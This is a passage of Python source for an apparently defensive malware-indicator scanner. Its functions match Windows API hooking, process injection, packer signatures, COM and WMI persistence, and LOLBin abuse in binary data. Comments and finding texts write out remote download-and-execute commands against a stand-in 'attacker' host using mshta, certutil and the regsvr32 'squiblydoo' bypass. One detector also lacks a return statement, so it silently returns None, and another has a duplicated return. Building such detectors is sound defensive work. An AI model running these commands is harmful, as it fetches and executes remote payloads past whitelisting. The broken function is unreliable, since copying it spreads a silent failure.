                "detail":   f"[{enc}] {detail}",
                "host":     "localhost",
                "port":     0,
            })

    return findings


def detect_windows_api_hooking_techniques(binary_data: bytes) -> list:
    """Scan for Windows API hooking and keylogger technique indicators.

    Grounded in Practical Malware Analysis ch.12 (Covert Malware Launching --
    Hook Injection) and ch.11 (User-Mode Rootkits -- IAT/Inline Hooking):
    SetWindowsHookEx for message interception/keylogging, GetAsyncKeyState for
    direct keystroke polling, WriteProcessMemory+CreateRemoteThread for the
    classic remote injection combo, NT-layer memory write APIs for syscall-level
    injection, and IsDebuggerPresent+ExitProcess proximity for anti-debug bailout.

    Args:
        binary_data: Raw bytes of the binary under analysis.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import re as _re

    findings: list = []

    # --- SetWindowsHookEx (A/W variants) ---
    # PMA ch.12: "The principal function call used to perform remote Windows
    # hooking is SetWindowsHookEx" -- used for keyloggers (WH_KEYBOARD/WH_KEYBOARD_LL)
    # and for DLL injection into remote process spaces.
    hook_api_pattern = _re.compile(
        rb"SetWindowsHookEx[AW]?\b",
        _re.IGNORECASE,
    )
    if hook_api_pattern.search(binary_data):
        findings.append({
            "severity": "CRITICAL",
            "title":    "WINDOWS_HOOK_API",
            "detail":   (
                "SetWindowsHookEx found -- Windows message hook API; "
                "used for keyloggers (WH_KEYBOARD/WH_KEYBOARD_LL), mouse hooks, "
                "and hook injection to load DLLs into remote process memory space "
                "(PMA ch.12: 'takes advantage of Windows hooks to intercept messages')"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Keystroke polling APIs ---
    # GetAsyncKeyState: polls key state without a hook -- used by polling keyloggers.
    # GetKeyState: synchronous state query, similar use pattern.
    keystroke_apis = [b"GetAsyncKeyState", b"GetKeyState"]
    for api in keystroke_apis:
        if api in binary_data:
            findings.append({
                "severity": "HIGH",
                "title":    "KEYSTROKE_MONITORING_API",
                "detail":   (
                    f"{api.decode()} found -- keystroke polling API; "
                    "used by polling-style keyloggers to capture key state without "
                    "installing a hook; frequently paired with logging loops that "
                    "write captured keystrokes to a file or C2 channel"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # one finding covers both; avoid duplicate

    # --- WriteProcessMemory + CreateRemoteThread within 512 bytes ---
    # Classic remote process injection combo.  The existing
    # detect_process_injection_techniques checks for these strings at the binary
    # level independently; this check adds the proximity constraint: both strings
    # appearing within a 512-byte window indicates the injection sequence is
    # likely compiled into the same function, not incidental co-presence.
    wpm = b"WriteProcessMemory"
    crt = b"CreateRemoteThread"
    wpm_positions = [m.start() for m in _re.finditer(_re.escape(wpm), binary_data)]
    crt_positions = [m.start() for m in _re.finditer(_re.escape(crt), binary_data)]
    injection_combo_found = False
    for wp in wpm_positions:
        for cr in crt_positions:
            if abs(wp - cr) <= 512:
                injection_combo_found = True
                break
        if injection_combo_found:
            break
    if injection_combo_found:
        findings.append({
            "severity": "CRITICAL",
            "title":    "CLASSIC_INJECTION_COMBO",
            "detail":   (
                "WriteProcessMemory + CreateRemoteThread within 512 bytes -- "
                "classic remote thread injection sequence detected as a co-located "
                "function unit; attacker writes shellcode/DLL path into a remote "
                "process and spawns a thread to execute it "
                "(PMA ch.12: canonical code-injection primitive)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- NT-layer memory write APIs (direct syscall injection) ---
    # NtWriteVirtualMemory / ZwWriteVirtualMemory bypass user-mode API hooks by
    # calling the NT layer directly; used in sophisticated injectors to evade
    # EDR/AV hooks on WriteProcessMemory.
    # PMA ch.7: "The Native API" -- Nt/Zw functions call directly into the kernel.
    nt_mem_write_apis = [b"NtWriteVirtualMemory", b"ZwWriteVirtualMemory"]
    for api in nt_mem_write_apis:
        if api in binary_data:
            findings.append({
                "severity": "CRITICAL",
                "title":    "NT_MEMORY_WRITE",
                "detail":   (
                    f"{api.decode()} found -- direct NT-layer memory write API; "
                    "bypasses user-mode EDR/AV hooks on WriteProcessMemory by "
                    "calling the kernel syscall layer directly; used in advanced "
                    "injectors and rootkit loaders "
                    "(PMA ch.7: 'Native API' -- Nt/Zw functions interface directly "
                    "with the Windows kernel)"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # Nt and Zw are functionally equivalent; one finding suffices

    # --- IsDebuggerPresent + ExitProcess within 128 bytes ---
    # Anti-debug bailout pattern: malware detects a debugger and immediately
    # terminates.  The proximity constraint (128 bytes) identifies the check-and-exit
    # as a single guard sequence rather than unrelated occurrences.
    # PMA ch.16 (Anti-Debugging): IsDebuggerPresent is the canonical Windows
    # debugger detection API.
    idp = b"IsDebuggerPresent"
    ep  = b"ExitProcess"
    idp_positions = [m.start() for m in _re.finditer(_re.escape(idp), binary_data)]
    ep_positions  = [m.start() for m in _re.finditer(_re.escape(ep),  binary_data)]
    antidebug_exit_found = False
    for ip in idp_positions:
        for ep_pos in ep_positions:
            if abs(ip - ep_pos) <= 128:
                antidebug_exit_found = True
                break
        if antidebug_exit_found:
            break
    if antidebug_exit_found:
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_DEBUG_EXIT_PATTERN",
            "detail":   (
                "IsDebuggerPresent + ExitProcess within 128 bytes -- "
                "anti-debug bailout sequence; malware checks for an attached debugger "
                "and immediately terminates to prevent analysis; the proximity "
                "constraint indicates a single guard function rather than incidental "
                "co-presence of these common APIs "
                "(PMA ch.16: IsDebuggerPresent is the canonical Windows debugger "
                "detection call)"
            ),
            "host": "localhost",
            "port": 0,
        })


def detect_malware_unpacking_indicators(binary_data: bytes) -> list:
    """Scan for runtime packer/crypter and known packer section-name signatures.

    Grounded in Practical Malware Analysis ch.18 (Packers and Unpacking):
    - OEP prep pattern: VirtualAlloc + WriteProcessMemory proximity signals
      the unpacking stub allocating a RWX region and copying decrypted code
      before jumping to the Original Entry Point.
    - UPX section names (UPX0/UPX1/UPX2): trivially unpacked with 'upx -d';
      common for commodity malware that wants size reduction without analysis
      resistance.
    - MPRESS section names (MPRESS1/MPRESS2): LZMA-compressed PE; less common
      but still encountered in commodity RATs and droppers.
    - Themida/VMProtect section names (.vmcode, .vmp0, .vmp1): indicate heavy
      virtualisation-based protection; strongly correlated with intentional
      analysis resistance and commercial/crimeware malware families.

    Args:
        binary_data: Raw bytes of the binary under analysis.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import re as _re

    findings: list = []

    # --- OEP prep pattern: VirtualAlloc + WriteProcessMemory in proximity ---
    # PMA ch.18 (Packer Anatomy): the unpacking stub allocates executable memory
    # with VirtualAlloc (MEM_COMMIT|PAGE_EXECUTE_READWRITE), writes the
    # decompressed/decrypted original code via WriteProcessMemory (or a direct
    # memcpy loop), then jumps to that region (the tail jump to OEP).  Both API
    # names appearing within 512 bytes of each other is the canonical static
    # indicator of a self-unpacking runtime stub.
    va_positions = [
        m.start()
        for m in _re.finditer(rb"VirtualAlloc(?:Ex)?\x00", binary_data)
    ]
    wpm_positions = [
        m.start()
        for m in _re.finditer(rb"WriteProcessMemory\x00", binary_data)
    ]
    oep_prep_found = False
    for va in va_positions:
        for wp in wpm_positions:
            if abs(va - wp) <= 512:
                oep_prep_found = True
                break
        if oep_prep_found:
            break
    if oep_prep_found:
        findings.append({
            "severity": "CRITICAL",
            "title":    "RUNTIME_UNPACKING",
            "detail":   (
                "VirtualAlloc + WriteProcessMemory within 512 bytes -- "
                "canonical unpacking-stub OEP prep sequence; packer/crypter "
                "allocates a RWX region, writes deobfuscated payload, and "
                "transfers execution via a tail jump; static analysis targets "
                "the stub rather than the real malware body -- dump from memory "
                "after VirtualAlloc returns to recover the unpacked image "
                "(PMA ch.18: 'Packer Anatomy' -- unpacking stub steps: alloc, "
                "decompress/decrypt, resolve imports, tail jump to OEP)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- UPX section names ---
    # PMA ch.18 (Tips and Tricks -- UPX): UPX is the most common packer used
    # for malware.  The section names UPX0, UPX1, UPX2 are preserved verbatim
    # in the PE section table.  UPX-packed files are trivially unpacked with
    # 'upx -d'; malware authors use it for size reduction with minimal analysis
    # resistance.  Modified UPX variants retain the section names but break
    # the decompressor -- still detectable here, still indicative.
    upx_sections = [b"UPX0", b"UPX1", b"UPX2"]
    upx_found = [s for s in upx_sections if s in binary_data]
    if upx_found:
        found_str = ", ".join(s.decode() for s in upx_found)
        findings.append({
            "severity": "CRITICAL",
            "title":    "UPX_PACKED",
            "detail":   (
                f"UPX section name(s) detected: {found_str} -- trivially "
                "unpackable with 'upx -d'; presence of UPX section names "
                "in malware is strongly correlated with commodity malware "
                "(RATs, droppers, loaders) that prioritise size over "
                "analysis resistance; modified UPX variants retain these "
                "names but break the standard decompressor -- attempt "
                "'upx -d' first, then fall back to manual OEP hunting "
                "(PMA ch.18: UPX is the most common packer used for malware)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- MPRESS section names ---
    # MPRESS uses LZMA compression and produces section names MPRESS1 and
    # MPRESS2.  Less prevalent than UPX but still found in commodity malware.
    # PMA ch.18 identifies MPRESS as a known packer family; the section names
    # are the reliable static indicator (PEiD signatures confirm this).
    mpress_sections = [b"MPRESS1", b"MPRESS2"]
    mpress_found = [s for s in mpress_sections if s in binary_data]
    if mpress_found:
        found_str = ", ".join(s.decode() for s in mpress_found)
        findings.append({
            "severity": "HIGH",
            "title":    "MPRESS_PACKED",
            "detail":   (
                f"MPRESS section name(s) detected: {found_str} -- "
                "MPRESS LZMA-compressed PE; automated unpackers (QuickUnpack, "
                "Generic OEP) succeed on standard MPRESS; manual approach: "
                "set hardware breakpoint on stack after PUSHAD in stub, "
                "run to POPAD, single-step to tail jump "
                "(PMA ch.18: MPRESS -- known packer family, LZMA compression)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Themida / VMProtect section names ---
    # PMA ch.18 (Themida): 'a very complicated packer with many features ...
    # anti-debugging and anti-analysis ... kernel component'.  VMProtect uses
    # similar virtualisation techniques.  The section names .vmcode / .vmp0 /
    # .vmp1 are the canonical static indicators; their presence signals
    # virtualization-based obfuscation -- the original instruction stream is
    # replaced by a custom VM bytecode interpreter, making static decompilation
    # extremely difficult.  Strong correlation with intentional analysis
    # resistance: commercial crimeware, banking trojans, APT tooling.
    vm_sections = [b".vmcode", b".vmp0", b".vmp1"]
    vm_found = [s for s in vm_sections if s in binary_data]
    if vm_found:
        found_str = ", ".join(s.decode() for s in vm_found)
        findings.append({
            "severity": "CRITICAL",
            "title":    "VMPROTECT_DETECTED",
            "detail":   (
                f"VMProtect/Themida section name(s) detected: {found_str} -- "
                "virtualisation-based code protection; original instruction "
                "stream replaced by custom VM bytecode; automated unpackers "
                "have inconsistent success -- use ProcDump to extract unpacked "
                "image from live process memory (bypasses anti-debug); kernel "
                "component present in Themida restricts in-process analysis; "
                "expect anti-VM, anti-debug, and anti-procmon features "
                "(PMA ch.18: Themida -- 'most of the features are anti-debugging "
                "and anti-analysis ... kernel component makes it much more "
                "difficult to analyze')"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_persistence_via_com(binary_data: bytes) -> list:
    """Scan for COM-based persistence and AppLocker-bypass indicators.

    Grounded in Practical Malware Analysis ch.11 (Persistence Mechanisms --
    registry-based persistence) and ch.12 (Covert Malware Launching -- launchers
    and DLL injection):
    - CLSID + InprocServer32: COM server self-registration for persistence;
      malware registers itself as a COM in-process server under a known or
      spoofed CLSID so it loads whenever the legitimate COM object is
      instantiated.
    - CoCreateInstance with CLSCTX_INPROC_SERVER: runtime COM object creation;
      common in launchers and loaders that proxy execution through the COM
      subsystem to blend into legitimate-looking call stacks.
    - GUID near DllRegisterServer: DllRegisterServer is the COM self-
      registration entry point; a GUID in proximity suggests the binary is
      registering a specific COM object identity, a pattern used in COM
      hijacking implants.
    - regsvr32 string: references the COM registration host binary; used both
      for legitimate COM registration and as an AppLocker/WDAC bypass
      (regsvr32 /s /n /u /i:<URL> scrobj.dll -- the 'squiblydoo' technique).

    Args:
        binary_data: Raw bytes of the binary under analysis.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import re as _re

    findings: list = []

    # --- CLSID + InprocServer32: COM server registration for persistence ---
    # PMA ch.11 (Persistence Mechanisms): malware achieves persistence by
    # writing registry keys under HKCR\CLSID\{...}\InprocServer32 pointing
    # to the malicious DLL.  Any process that CoCreates the spoofed CLSID
    # will load the malware DLL in-process.  Both strings present in the
    # binary = the binary contains the registry-key strings needed for
    # self-registration.
    clsid_present  = b"CLSID" in binary_data
    inproc_present = b"InprocServer32" in binary_data
    if clsid_present and inproc_present:
        findings.append({
            "severity": "HIGH",
            "title":    "COM_HIJACK_SURFACE",
            "detail":   (
                "CLSID + InprocServer32 strings present -- binary contains "
                "COM in-process server registration strings; malware writes "
                "HKCR\\CLSID\\{<guid>}\\InprocServer32 = <malicious_dll_path> "
                "to load itself whenever the spoofed COM object is instantiated; "
                "common in COM hijacking implants that replace legitimate "
                "CLSID registrations under HKCU (no admin required) to persist "
                "across logons "
                "(PMA ch.11: registry-based persistence -- COM in-process "
                "server registration)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CoCreateInstance with CLSCTX_INPROC_SERVER ---
    # CoCreateInstance is the primary COM object creation API.
    # CLSCTX_INPROC_SERVER (value 0x1) requests an in-process (DLL) server.
    # Its presence in a suspicious binary indicates the binary instantiates
    # COM objects in-process -- a common technique in launchers and loaders
    # that proxy execution through the COM subsystem.
    # PMA ch.12 (Covert Malware Launching): launchers use COM to covertly
    # load and execute secondary payloads while appearing as a legitimate
    # COM client.
    if b"CoCreateInstance" in binary_data:
        detail_inproc = ""
        if b"CLSCTX_INPROC_SERVER" in binary_data:
            detail_inproc = (
                "; CLSCTX_INPROC_SERVER string also present -- "
                "in-process DLL server is the requested execution context"
            )
        findings.append({
            "severity": "MEDIUM",
            "title":    "COM_OBJECT_CREATION",
            "detail":   (
                "CoCreateInstance found -- COM object instantiation API; "
                "used in launchers and loaders to proxy execution through "
                "the COM subsystem, producing call stacks that appear as "
                "legitimate COM client activity; combined with CLSID strings "
                "this pattern indicates COM-based payload staging"
                + detail_inproc +
                " (PMA ch.12: launchers use COM APIs to covertly execute "
                "secondary payloads)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- GUID near DllRegisterServer: COM self-registration implant ---
    # DllRegisterServer is the entry point called by regsvr32 to register a
    # COM server.  A GUID pattern ({XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX})
    # within 512 bytes of DllRegisterServer indicates the binary is a COM DLL
    # that registers a specific CLSID identity -- the pattern used by COM
    # hijacking implants to install themselves under a chosen GUID.
    # PMA ch.11: COM persistence requires both the DLL and the registry entry
    # that maps a CLSID to that DLL path.
    guid_re = _re.compile(
        rb"\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}"
        rb"-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}"
    )
    drs_positions  = [
        m.start()
        for m in _re.finditer(rb"DllRegisterServer\x00", binary_data)
    ]
    guid_positions = [m.start() for m in guid_re.finditer(binary_data)]
    com_inject_found = False
    matched_guid_bytes = b""
    for drs in drs_positions:
        for gp in guid_positions:
            if abs(drs - gp) <= 512:
                com_inject_found = True
                matched_guid_bytes = binary_data[gp: gp + 38]
                break
        if com_inject_found:
            break
    if com_inject_found:
        guid_str = matched_guid_bytes.decode(errors="replace")
        findings.append({
            "severity": "HIGH",
            "title":    "COM_DLLINJECT_SURFACE",
            "detail":   (
                f"GUID {guid_str!r} within 512 bytes of DllRegisterServer -- "
                "binary exports a COM self-registration entry point adjacent "
                "to a specific CLSID; pattern matches COM hijacking implants "
                "that register themselves under a chosen GUID via regsvr32 or "
                "a custom installer, then persist by replacing a legitimate "
                "CLSID registration; the GUID is the COM identity that will "
                "be used to instantiate the malicious DLL in victim processes "
                "(PMA ch.11: COM persistence -- DllRegisterServer + CLSID "
                "proximity indicates self-registering malicious COM server)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- regsvr32 string: COM registration host / AppLocker bypass ---
    # regsvr32.exe is the Windows COM server registration host.  Its presence
    # as a string in a binary can indicate:
    # (a) the binary spawns regsvr32 to register or unregister a COM DLL;
    # (b) the 'squiblydoo' AppLocker/WDAC bypass:
    #     regsvr32 /s /n /u /i:<URL> scrobj.dll
    #     -- regsvr32 is a signed Microsoft binary that downloads and executes
    #     a remote script COM object, bypassing application whitelisting.
    # PMA ch.11 (Persistence): COM registration via regsvr32 is the standard
    # persistence installation vector for COM-based malware.
    if b"regsvr32" in binary_data or b"regsvr32.exe" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title":    "REGSVR32_REFERENCE",
            "detail":   (
                "regsvr32 string found -- references the Windows COM "
                "registration host binary; dual-use: (1) legitimate COM DLL "
                "self-registration/unregistration via 'regsvr32 /s <dll>'; "
                "(2) AppLocker/WDAC bypass via 'regsvr32 /s /n /u /i:<url> "
                "scrobj.dll' (squiblydoo) -- regsvr32 is a trusted signed "
                "binary that can download and execute a remote script COM "
                "object without triggering application whitelisting; combined "
                "with CLSID/InprocServer32 strings, high confidence of COM "
                "persistence installation "
                "(PMA ch.11: COM registration via regsvr32 is the standard "
                "persistence installation vector for COM-based malware)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings

    return findings


def detect_wmi_persistence(binary_data: bytes) -> list:
    """Detect WMI-based persistence and process-execution indicators.

    Sources: PMA ch.7 (COM objects via CoCreateInstance; IWbemServices is the
    primary WMI COM interface), ch.11 (persistence mechanisms that bypass the
    registry; WMI event subscriptions store payload in the CIM repository,
    invisible to Autoruns unless WMI providers are explicitly queried),
    ch.12 (covert process creation paths that hide parent-child relationships).
    WMI relies entirely on COM for its API surface, so the same COM primitives
    PMA covers under covert launching and process enumeration underpin all
    WMI-based persistence and lateral movement.
    """
    import re as _re
    findings = []

    # --- IWbemServices / WbemAdministrativeTools: WMI COM interface access ---
    # IWbemServices is the root COM interface through which all WMI operations
    # are dispatched: ConnectServer, ExecQuery, ExecMethod, ExecNotificationQuery.
    # WbemAdministrativeTools is the administrative COM ProgID for the WMI
    # snap-in and automation scripts.  Presence in a binary indicates the sample
    # consumes the WMI COM API stack for management queries, process enumeration,
    # or event subscription.
    if b"IWbemServices" in binary_data or b"WbemAdministrativeTools" in binary_data:
        indicator = (
            b"IWbemServices" if b"IWbemServices" in binary_data
            else b"WbemAdministrativeTools"
        )
        findings.append({
            "severity": "HIGH",
            "title":    "WMI_SERVICE_INTERFACE",
            "detail":   (
                f"{indicator.decode(errors='replace')!r} found -- WMI COM interface "
                "accessed; IWbemServices is the primary COM interface through which "
                "all WMI operations are dispatched (ConnectServer, ExecQuery, "
                "ExecMethod); WbemAdministrativeTools is the administrative COM "
                "ProgID used by WMI automation scripts; presence indicates the "
                "sample consumes the WMI API stack for management queries, process "
                "enumeration, or event subscription setup; combined with "
                "Win32_Process or event-subscription strings, high confidence of "
                "WMI-based lateral movement or persistence "
                "(PMA ch.7: COM objects accessed via CoCreateInstance/IWbemServices "
                "are the primary WMI consumer path; ch.11: WMI COM access is the "
                "foundation of all WMI-based persistence and lateral movement)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- ExecQuery + Win32_Product / Win32_Process: WMI process execution ---
    # ExecQuery executes a WQL (WMI Query Language) query against the WMI
    # repository.  Querying Win32_Product enumerates installed software (recon,
    # triggers an MSI consistency check -- noisy).  Querying or calling Create()
    # on Win32_Process is the canonical WMI process-creation technique:
    #   GetObject("winmgmts:").Get("Win32_Process").SpawnInstance_()
    # This decouples the spawned process from the parent call chain and bypasses
    # hooks on CreateProcess/NtCreateProcess that many sensors rely on.
    has_execquery = b"ExecQuery" in binary_data
    has_win32_proc = b"Win32_Process" in binary_data
    has_win32_prod = b"Win32_Product" in binary_data
    if has_execquery and (has_win32_proc or has_win32_prod):
        target = "Win32_Process" if has_win32_proc else "Win32_Product"
        findings.append({
            "severity": "CRITICAL",
            "title":    "WMI_PROCESS_EXECUTION",
            "detail":   (
                f"ExecQuery + {target} found -- WMI-based process launch or "
                "software enumeration; ExecQuery dispatches a WQL query against "
                "the WMI CIM repository; Win32_Process.Create() launches arbitrary "
                "processes through wmiprvse.exe (the WMI provider host), "
                "decoupling the spawned process from the caller's parent-child "
                "chain and bypassing hooks on CreateProcess/NtCreateProcess that "
                "many EDR sensors rely on for behavioral correlation; Win32_Product "
                "queries trigger a per-package MSI consistency check (high-noise "
                "recon signal); combined with IWbemServices, high confidence of "
                "active WMI consumer "
                "(PMA ch.7: process creation via non-standard API paths hides "
                "parent-child relationships; ch.11: WMI process execution is a "
                "living-off-the-land lateral movement primitive that avoids "
                "the standard Win32 CreateProcess call chain)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- __EventFilter + __EventConsumer + __FilterToConsumerBinding: event sub ---
    # WMI permanent event subscriptions are the canonical fileless/registry-free
    # persistence mechanism.  The subscription consists of three WMI objects:
    #   __EventFilter         -- the trigger (timer, process creation, login)
    #   __EventConsumer       -- the action (ActiveScriptEventConsumer,
    #                           CommandLineEventConsumer, LogFileEventConsumer)
    #   __FilterToConsumerBinding -- links filter to consumer
    # All three are persisted in the WMI repository (OBJECTS.DATA / OBJECTS.MAP)
    # rather than the registry or filesystem.  Detection requires WMI repository
    # enumeration or CIM-store forensics; standard autoruns and registry analysis
    # miss this vector entirely.
    has_filter   = b"__EventFilter" in binary_data
    has_consumer = b"__EventConsumer" in binary_data
    has_binding  = b"__FilterToConsumerBinding" in binary_data
    if has_filter and has_consumer and has_binding:
        findings.append({
            "severity": "CRITICAL",
            "title":    "WMI_EVENT_SUBSCRIPTION",
            "detail":   (
                "__EventFilter + __EventConsumer + __FilterToConsumerBinding all "
                "present -- WMI permanent event subscription persistence; the "
                "subscription triad is stored in the WMI CIM repository "
                "(%SystemRoot%\\System32\\wbem\\Repository\\OBJECTS.DATA) not in "
                "the registry or filesystem; the consumer executes arbitrary "
                "commands (CommandLineEventConsumer) or scripts "
                "(ActiveScriptEventConsumer) on trigger conditions: timed intervals "
                "(__TimerEvent), process creation (Win32_ProcessStartTrace), or "
                "user logon (Win32_LogonSession); detection requires enumerating "
                "__EventFilter and __EventConsumer via wmic or "
                "Get-CimInstance __EventFilter -- standard Autoruns and "
                "registry-only analysis miss this entirely "
                "(PMA ch.11: persistence mechanisms that bypass registry hives; "
                "WMI event subscriptions store payload in the WMI CIM repository, "
                "invisible to Autoruns unless WMI providers are explicitly queried)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- mofcomp / .mof: WMI managed object format compilation ---
    # MOF (Managed Object Format) files define WMI classes, instances, and event
    # subscriptions in text form.  mofcomp.exe compiles them into the WMI CIM
    # repository.  Malware uses mofcomp to install WMI event subscriptions
    # without calling the WMI COM API directly -- the payload is a .mof file
    # that, when compiled, registers the persistence triad.  The .mof file may
    # be deleted after compilation, leaving only the CIM repository artifact.
    mof_pattern = _re.compile(rb"mofcomp|\.mof\b", _re.IGNORECASE)
    mof_match = mof_pattern.search(binary_data)
    if mof_match:
        snippet = mof_match.group(0).decode(errors="replace")
        findings.append({
            "severity": "HIGH",
            "title":    "WMI_MOF_COMPILE",
            "detail":   (
                f"{snippet!r} found -- WMI managed object format persistence; "
                "mofcomp.exe compiles a .mof text file into the WMI CIM repository, "
                "registering classes, instances, and event subscriptions without "
                "touching HKLM or the filesystem beyond the repository itself; "
                "malware extracts an embedded .mof payload to disk and invokes "
                "mofcomp.exe via CreateProcess or ShellExecute, installing a WMI "
                "event subscription that persists across reboots; the .mof source "
                "file is typically deleted after compilation, leaving only the "
                "repository artifact; detection: enumerate __EventFilter and "
                "__EventConsumer via wmic or Get-CimInstance "
                "(PMA ch.11: persistence via file-based installation into system "
                "stores; mofcomp is the offline WMI repository compiler, "
                "analogous to regsvr32 for COM but targeting the CIM store)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_lolbin_abuse(binary_data: bytes) -> list:
    """Detect living-off-the-land binary (LOLBin) abuse indicators.

    Sources: PMA ch.3 (rundll32 as DLL execution container; malware DLLs
    frequently run all payload code in DllMain or an exported installer
    function invoked via rundll32), ch.7 (CreateProcess with a signed host
    binary hides the payload behind the host's trust reputation; process
    creation via non-standard paths), ch.11 (regsvr32 COM registration as
    the standard persistence installation vector; remote payload execution
    via trusted binary is the canonical living-off-the-land pattern).
    LOLBins are signed Microsoft binaries that proxy execution of unsigned or
    remote payloads, bypassing application whitelisting and reducing
    unsigned-execution telemetry.
    """
    import re as _re
    findings = []

    # --- mshta.exe + http / vbscript: HTML application binary abuse ---
    # mshta.exe (Microsoft HTML Application Host) executes .hta files, which
    # are full-trust HTML + script applications.
    #   mshta.exe http://attacker/payload.hta   -- remote HTA download+execute
    #   mshta.exe vbscript:Execute("...")        -- inline VBScript, no file drop
    # Both paths produce a process tree rooted in a Microsoft-signed binary,
    # bypassing application whitelisting that blocks unsigned executables.
    mshta_pattern = _re.compile(rb"mshta(?:\.exe)?", _re.IGNORECASE)
    if mshta_pattern.search(binary_data):
        proto_pattern = _re.compile(rb"https?://|vbscript\s*:", _re.IGNORECASE)
        if proto_pattern.search(binary_data):
            findings.append({
                "severity": "CRITICAL",
                "title":    "MSHTA_LOLBIN",
                "detail":   (
                    "mshta.exe + http/vbscript pattern found -- HTML application "
                    "binary abuse; mshta.exe is the signed Microsoft HTA host that "
                    "executes full-trust script payloads embedded in .hta files or "
                    "inline via the vbscript: URI handler; 'mshta http://...' "
                    "downloads and executes a remote HTA payload without writing a "
                    "script file to disk; 'mshta vbscript:Execute(...)' runs inline "
                    "VBScript with no file drop at all; both paths produce a "
                    "process tree rooted in a Microsoft-signed binary, bypassing "
                    "application whitelisting that blocks unsigned executables; "
                    "behavioral signal: mshta.exe spawning cmd.exe, powershell.exe, "
                    "or making outbound network connections "
                    "(PMA ch.7: CreateProcess with a signed host binary hides the "
                    "payload behind the host trust reputation; ch.11: remote "
                    "payload execution via trusted binary is the canonical "
                    "living-off-the-land pattern)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- certutil.exe + -decode / -urlcache: certificate utility downloader ---
    # certutil.exe is the Windows certificate management utility.  Malware abuses
    # it to download files and decode Base64:
    #   certutil -urlcache -split -f http://attacker/payload.exe out.exe
    #   certutil -decode encoded.b64 payload.exe
    # -urlcache invokes the WinINET URL cache subsystem to fetch arbitrary URLs.
    # -decode handles Base64 decoding, enabling text-safe transport of PE payloads
    # that evade content filters.  certutil.exe is a signed binary, so execution
    # is allowed by most application whitelisting policies.
    certutil_pattern = _re.compile(rb"certutil(?:\.exe)?", _re.IGNORECASE)
    if certutil_pattern.search(binary_data):
        abuse_pattern = _re.compile(rb"-decode\b|-urlcache\b", _re.IGNORECASE)
        abuse_match = abuse_pattern.search(binary_data)
        if abuse_match:
            flag = abuse_match.group(0).decode(errors="replace")
            findings.append({
                "severity": "CRITICAL",
                "title":    "CERTUTIL_LOLBIN",
                "detail":   (
                    f"certutil.exe + {flag!r} found -- certificate utility used for "
                    "download or Base64 decode; certutil -urlcache fetches arbitrary "
                    "URLs via the Windows URL cache (WinINET), writing the response "
                    "to a named output file on disk; certutil -decode converts a "
                    "Base64-encoded file to binary, enabling text-safe transport of "
                    "PE payloads that evade content filters; common dropper chain: "
                    "download encoded payload with -urlcache, decode with -decode, "
                    "execute with rundll32 or CreateProcess; certutil.exe is a "
                    "Microsoft-signed binary, so execution is allowed by most "
                    "application whitelisting policies and produces a signed-binary "
                    "network connection "
                    "(PMA ch.7: URLDownloadToFile + WinExec is the standard "
                    "downloader pattern; certutil -urlcache is the LOLBin equivalent "
                    "using the WinINET cache API through a trusted signed binary)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- regsvr32.exe + scrobj.dll / /s /n /u /i: squiblydoo COM scriptlet ---
    # regsvr32.exe is the COM server registration host.  The squiblydoo bypass:
    #   regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
    # scrobj.dll (Windows Script Component runtime) is invoked as the DLL to
    # register; the /i flag passes the URL as a parameter to DllInstall, which
    # fetches and executes the .sct (scriptlet) file.  No file is written for the
    # scriptlet payload; execution is proxied through a signed binary.
    regsvr_pattern = _re.compile(rb"regsvr32(?:\.exe)?", _re.IGNORECASE)
    if regsvr_pattern.search(binary_data):
        squib_pattern = _re.compile(
            rb"scrobj\.dll|/s\s+/n\s+/u\s+/i|/s\b.{0,64}/i\b", _re.IGNORECASE
        )
        if squib_pattern.search(binary_data):
            findings.append({
                "severity": "CRITICAL",
                "title":    "REGSVR32_LOLBIN",
                "detail":   (
                    "regsvr32.exe + scrobj.dll or /s /n /u /i flags found -- COM "
                    "scriptlet execution (squiblydoo AppLocker bypass); regsvr32 "
                    "/s /n /u /i:<url> scrobj.dll passes the URL to scrobj.dll's "
                    "DllInstall, which downloads and executes a .sct (Windows Script "
                    "Component) scriptlet containing JScript or VBScript; no payload "
                    "file is written to disk; regsvr32.exe is a Microsoft-signed "
                    "binary, so the execution chain bypasses application whitelisting "
                    "that only allows signed binaries; network traffic appears as a "
                    "signed Microsoft binary making an outbound HTTP request "
                    "(PMA ch.11: regsvr32 COM registration as the standard "
                    "persistence installation vector; squiblydoo extends this to "
                    "remote scriptlet execution via scrobj.dll's DllInstall "
                    "parameter pathway -- COM server registration repurposed as "
                    "an AppLocker bypass)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- wscript.exe / cscript.exe + .vbs / .js: Windows Script Host execution ---
    # wscript.exe (GUI) and cscript.exe (console) execute VBScript (.vbs) and
    # JScript (.js) files via the WSH engine (vbscript.dll, jscript.dll).
    # Malware uses WSH to run downloader or dropper scripts that fetch PE
    # payloads, modify registry keys, or stage additional implants.  Scripts may
    # be written to disk transiently or passed inline; the WSH engine provides
    # full filesystem, WScript.Shell, and COM access.
